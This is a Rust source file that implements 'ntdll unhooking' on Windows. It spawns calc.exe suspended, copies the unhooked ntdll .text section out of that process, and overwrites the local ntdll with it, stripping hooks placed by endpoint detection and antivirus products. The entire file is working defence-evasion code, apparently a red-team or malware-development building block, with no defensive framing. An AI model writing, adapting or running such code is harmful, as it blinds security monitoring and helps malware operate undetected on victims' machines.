use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpebteb::{PEB, TEB},
    winapi::ctypes::c_void,
};
use std::{ffi::CString, panic, ptr::null_mut};
use windows::{
    core::PSTR,
    Win32::System::{
        Diagnostics::Debug::{ReadProcessMemory, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER},
        Kernel::NT_TIB,
        Memory::{GetProcessHeap, HeapAlloc, VirtualProtect, HEAP_ZERO_MEMORY, PAGE_EXECUTE_WRITECOPY, PAGE_PROTECTION_FLAGS},
        SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
        Threading::{CreateProcessA, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA},
    },
};

fn main() {
    unsafe { ntdll_unhooking() };
}

unsafe fn ntdll_unhooking() {
    let process = CString::new("C:\\Windows\\System32\\calc.exe").unwrap().into_raw() as _;
    let address_ntdll = ntdll_local_address("ntdll.dll".to_string()).expect("[!] Error retrieving ntdll");
    
    let startup_info = STARTUPINFOA { cb: std::mem::size_of::<STARTUPINFOA>() as u32, ..Default::default() };
    let mut process_information = PROCESS_INFORMATION::default();
    CreateProcessA(
        None,
        PSTR(process),
        None,
        None,
        false,
        CREATE_SUSPENDED,
        None,
        None,
        &startup_info,
        &mut process_information,
    ).unwrap_or_else(|e| panic!("[!] CreateProcessA Failed With Error: {e}"));

    let dos_header = address_ntdll as *mut IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        panic!("[!] INVALID DOS SIGNATURE");
    }

    let nt_header = ((*dos_header).e_lfanew as usize + address_ntdll as usize) as *mut IMAGE_NT_HEADERS64;
    if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
        panic!("[!] INVALID NT SIGNATURE");
    }

    let size_ntdll = (*nt_header).OptionalHeader.SizeOfImage;
    let buffer_ntdll = HeapAlloc(GetProcessHeap().unwrap(),HEAP_ZERO_MEMORY,size_ntdll as usize);
    let mut return_len = 0;
    ReadProcessMemory(
        process_information.hProcess,
        address_ntdll as _,
        buffer_ntdll,
        size_ntdll as usize,
        Some(&mut return_len),
    ).unwrap_or_else(|e| panic!("[!] ReadProcessMemory Failed With Error: {e}"));

    let section_header =  (nt_header as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;
    let mut tmp_nt_local = null_mut();
    let mut tmp_nt_process = null_mut();
    let mut ntdll_txt_size: usize = 0;

    for i in 0..(*nt_header).FileHeader.NumberOfSections {
        let section = (*section_header.add(i.into())).Name;
        let name = std::str::from_utf8(&section).unwrap().trim_matches('\0');
        if name == ".text" {
            tmp_nt_local = (address_ntdll as usize + (*section_header.add(i.into())).VirtualAddress as usize) as *mut std::ffi::c_void;
            tmp_nt_process =  (buffer_ntdll as usize + (*section_header.add(i.into())).VirtualAddress as usize) as *mut std::ffi::c_void;
            ntdll_txt_size = (*section_header.add(i.into())).Misc.VirtualSize as usize;
        }
    }

    println!("NTDLL HOOKED ADDRESS: {:?}", tmp_nt_local);
    println!("NTDLL UNHOOKED ADDRESS: {:?}", tmp_nt_process);

    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    VirtualProtect(
        tmp_nt_local, 
        ntdll_txt_size, 
        PAGE_EXECUTE_WRITECOPY,
        &mut old_protect
    ).unwrap_or_else(|e| panic!("[!] VirtualProtect Failed With Error: {e}"));

    std::ptr::copy_nonoverlapping(tmp_nt_process, tmp_nt_local, ntdll_txt_size);

    VirtualProtect(
        tmp_nt_local, 
        ntdll_txt_size, 
        old_protect, 
        &mut old_protect
    ).unwrap_or_else(|e| panic!("[!] VirtualProtect (2) Failed With Error: {e}"));

    println!("[+] FINISH :)")
}

unsafe fn ntdll_local_address(dll: String) -> Result<*mut c_void, ()> {
    let peb = get_peb();
    let ldr = (*peb).Ldr;
    let mut list_entry = (*ldr).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;

    while !(*list_entry).DllBase.is_null() {
        let buffer = std::slice::from_raw_parts(
            (*list_entry).BaseDllName.Buffer,
            ((*list_entry).BaseDllName.Length / 2) as usize,
        );
        let dll_name = String::from_utf16(buffer)
            .unwrap()
            .to_string()
            .to_lowercase();

        if dll.to_lowercase() == dll_name {
            return Ok((*list_entry).DllBase);
        }

        list_entry = (*list_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
    }

    Err(())
}

unsafe fn get_peb() -> *mut PEB {
    let teb_offset = ntapi::FIELD_OFFSET!(NT_TIB, Self_) as u32;

    #[cfg(target_arch = "x86_64")]
    {
        use ntapi::winapi_local::um::winnt::__readgsqword;
        let teb = __readgsqword(teb_offset) as *mut TEB;
        (*teb).ProcessEnvironmentBlock
    }

    #[cfg(target_arch = "x86")]
    {
        use ntapi::winapi_local::um::winnt::__readfsdword;
        let teb = __readfsdword(teb_offset) as *mut TEB;
        (*teb).ProcessEnvironmentBlock
    }
}
